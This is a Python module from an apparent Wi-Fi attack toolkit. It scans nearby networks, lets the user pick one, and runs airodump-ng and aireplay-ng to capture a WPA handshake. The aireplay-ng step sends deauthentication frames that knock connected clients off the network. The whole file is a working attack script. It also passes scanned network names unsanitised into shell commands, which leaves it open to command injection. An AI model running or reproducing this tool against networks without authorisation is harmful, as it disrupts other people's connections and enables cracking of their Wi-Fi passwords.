# attacks/handshake_capture.py

import subprocess
import os
import time
from scanner.wifi_scanner import scan_networks, choose_target

HANDSHAKE_DIR = "data/handshakes"

def wpa_handshake_capture(adapter):

    print("[*] Scanning for target networks...\n")
    networks = scan_networks(adapter)

    if not networks:
        print("[-] No networks found.")
        return

    target = choose_target(networks)
    bssid = target[1]
    channel = target[2]
    essid = target[3].replace(" ", "_")  # Clean filename

    # Prepare output path
    timestamp = time.strftime("%Y%m%d-%H%M%S")
    output_file = f"{HANDSHAKE_DIR}/{essid}_{timestamp}"

    print(f"[+] Target: {essid} | BSSID: {bssid} | Channel: {channel}")
    print(f"[+] Capturing handshake and saving to {output_file}-01.cap")

    try:
        # Start airodump
        airodump_cmd = f"sudo airodump-ng --bssid {bssid} --channel {channel} -w {output_file} {adapter}"
        airodump_proc = subprocess.Popen(airodump_cmd, shell=True)

        # Wait a few seconds for airodump to start
        time.sleep(5)

        # Start deauth
        aireplay_cmd = f"sudo aireplay-ng --deauth 15 -a {bssid} {adapter}"
        subprocess.run(aireplay_cmd, shell=True)

        print("[*] Waiting for handshake... (Press Ctrl+C to stop early)\n")
        time.sleep(30)  # Let it run for 30 seconds or more

        airodump_proc.terminate()
        print(f"\n✅ Handshake capture process completed! Check: {output_file}-01.cap")

    except KeyboardInterrupt:
        print("\n[!] Capture interrupted by user.")
        airodump_proc.terminate()

    except Exception as e:
        print(f"[!] Error during handshake capture: {e}")
